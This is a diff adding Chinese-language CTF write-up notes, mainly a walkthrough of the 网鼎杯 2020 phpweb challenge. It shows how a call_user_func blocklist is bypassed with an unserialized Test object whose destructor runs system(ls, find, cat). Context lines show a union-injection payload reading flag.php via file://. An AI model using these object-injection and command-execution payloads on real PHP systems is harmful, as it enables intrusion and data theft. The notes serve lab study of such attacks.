@@ -667,3 +667,116 @@ class UserInfo
 `/view.php?no=0+union/**/select+1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
 直接在第四列data的位置上填上序列化后的对象。
 访问页面查看源码，拿到base64的flag,解码后拿到flag。
+[网鼎杯 2020 朱雀组]phpweb1 #命令执行漏洞 #PHP反序列化漏洞 
+进入看到孙笑川以及报错的文字：
+```
+Warning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
+2023-11-10 09:57:57 am
+```
+burp抓包看到有post请求，请求为：
+`func=date&p=Y-m-d+h%3Ai%3As+a`
+刚好是上面报错的代码，猜解func是函数，p是参数，界面会回显。
+随便输入一个echo函数，其报错：
+```html
+<p>
+    <br />
+<b>Warning</b>:  call_user_func() expects parameter 1 to be a valid callback, function 'echo' not found or invalid function name in <b>/var/www/html/index.php</b> on line <b>24</b><br />
+</p>
+```
+说明其使用call_user_func函数来处理我们POST的参数。
+call_user_func函数的官方文档:
+```
+call_user_func
+(PHP 4, PHP 5, PHP 7, PHP 8)
+call_user_func — 把第一个参数作为回调函数调用
+说明 ¶
+call_user_func(callable $callback, mixed ...$args): mixed
+第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。
+参数 ¶
+callback
+将被调用的回调函数（callable）。
+args
+0个或以上的参数，被传入回调函数。
+```
+如果搭配assert使用，就可以达到执行代码的效果
+```
+assert(mixed $assertion, Throwable|string|null $description = null): bool
+assertion
+可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。
+警告
+在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。
+description
+如果 description 是 Throwable 的实例，只有在 assertion 执行失败时才会抛出。
+```
+传入函数assert,其回显hacker,assert被过滤，那么这道题就不能使用assert了
+既然可以执行我传入的函数，想看页面的源代码就比较简单了，使用highlight_file函数，post下面的参数：
+`func=highlight_file&p=index.php`
+回显了PHP源代码：
+```php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk", "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+function gettime($func, $p) {
+$result = call_user_func($func, $p);
+$a= gettype($result);
+if ($a == "string") {
+return $result;
+} else {return "";}
+}
+class Test {
+var $p = "Y-m-d h:i:s a";
+var $func = "date";
+function __destruct() {
+if ($this->func != "") {
+echo gettime($this->func, $this->p);
+}
+}
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+ 
+if ($func != null) {
+$func = strtolower($func);
+if (!in_array($func,$disable_fun)) {
+echo gettime($func, $p);
+}else {
+die("Hacker...");
+}
+}
+?>
+```
+可以看到其过滤了很多可以利用的函数，且调用的函数返回字符串类型才会回显，不然回显空。
+而其中有一个类Test，可以利用这个类直接绕过上面的所有过滤。
+思路为：将类参数func改为要执行的函数，p为参数，将其序列化，post请求里func请求unserialize函数，p传递序列化后的Test对象。
+```php
+<?php
+function gettime($func, $p) {
+$result = call_user_func($func, $p);
+$a= gettype($result);
+if ($a == "string") {
+return $result;
+} else {return "";}
+}
+ 
+class Test {
+var $p = "参数";
+var $func = "函数";
+function __destruct() {
+if ($this->func != "") {
+echo gettime($this->func, $this->p);
+}
+}
+}
+$a = new Test();
+echo serialize($a)
+?>
+```
+尝试：传递system与ls
+`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}`
+显示只有bg.jpg与index.php
+后面ls连续使用了../来看其他目录，并没有明显的flag存在迹象。
+使用find函数：
+`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}`
+找到目录：
+`/tmp/flagoefiu4r93`
+打开文件拿到flag。
+`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
+ls找不到就直接find，不能傻乎乎的../../../../../../../。。。。。了
